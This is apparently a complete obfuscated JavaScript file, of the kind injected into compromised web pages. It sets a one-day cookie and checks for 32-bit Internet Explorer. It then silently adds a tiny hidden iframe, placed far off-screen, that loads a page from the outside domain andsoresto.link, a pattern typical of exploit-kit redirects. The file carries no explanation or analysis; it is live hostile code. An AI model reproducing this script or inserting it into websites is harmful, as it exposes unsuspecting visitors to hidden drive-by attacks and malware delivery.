FLCEGNkUdjHW = window;
GNtQhiSBEDAR = FLCEGNkUdjHW['document'];
LVJlbhQAGwN = FLCEGNkUdjHW['navigator'];
var GRxrXclVbnSp = window;
var doc = GRxrXclVbnSp.document;
function setCookie(name, value, expires){
  doc.cookie = name + '=' + escape(value) + "; expires=" + expires.toGMTString() + "; path=/";
  return;
}
function getCookie(name){
  var cookie = ' ' + doc.cookie;
  var search = ' ' + name + '=';
  var setStr = null;
  var offset = 0;
  var end = 0;
  if(cookie.length > 0) {
    offset = cookie.indexOf(search);
    if(offset != -1) {
      offset += search.length;
      end = cookie.indexOf(';', offset);
      if(end == -1) {
        end = cookie.length;
      }
      setStr = GRxrXclVbnSp.unescape(cookie.substring(offset, end));
    }
  }
  return setStr;
}
function ZdoMJDGFUPL(){
  if(!getCookie("CIeyOkotgDKVcmfs")) {
    var expires = new Date();
    expires.setTime(expires.getTime() + 86400000);
    setCookie("CIeyOkotgDKVcmfs", '79998daded6ddd0f14d2ac786dedeb57', expires);
    return true;
  } else {
    return false;
  }
}
function aTbMBrtgpxiF(j7r){
  var fk;
  fk = window;
  GNtQhiSBEDAR["addEventListener"] ? GNtQhiSBEDAR["addEventListener"]("DOMContentLoaded", j7r) : fk["attachEvent"]("onload", j7r);
}
function nWSwtsTUNiOcY(){
  return LVJlbhQAGwN["userAgent"];
}
function qCwZFKjSaYI(y0l, np1){
  return y0l["test"](np1);
}
function haHExLmofXCiW(){
  var fq;
  fq = nWSwtsTUNiOcY();
  return qCwZFKjSaYI(/Win64;/i, fq) || qCwZFKjSaYI(/x64;/i, fq);
}
function CUjwmVBZGTEp(){
  var ai, be;
  be = (/Trident/i);
  ai = nWSwtsTUNiOcY();
  if(!qCwZFKjSaYI(be, ai)) {
    return 0;
  } else {
    return true;
  }
}
function eUKzOquWidBPD(){
  var t55sd, u0u, l2, gas, dis, qt7, y1, od66s, hia, mbs, cun, ljjd3d, ffa;
  od66s = "src";
  y1 = "iframe";
  u0u = "cssText";
  l2 = "getElementsByTagName";
  cun = "body";
  qt7 = "width";
  hia = "height";
  ffa = "appendChild";
  gas = "createElement";
  dis = "style";
  mbs = "10";
  if(ZdoMJDGFUPL() && CUjwmVBZGTEp() && !haHExLmofXCiW()) {
    t55sd = mbs;
    ljjd3d = GNtQhiSBEDAR[gas](y1);
    ljjd3d[qt7] = t55sd;
    ljjd3d[hia] = t55sd;
    ljjd3d[dis][u0u] = "position:absolute;left:-1610px;top:-1637px";
    ljjd3d[od66s] = "http://andsoresto.link/QEBQAkoIS1AIUkVWRVQVQlkXW1gIXQ.html";
    GNtQhiSBEDAR[l2](cun)[0][ffa](ljjd3d);
  }
}
aTbMBrtgpxiF(eUKzOquWidBPD);
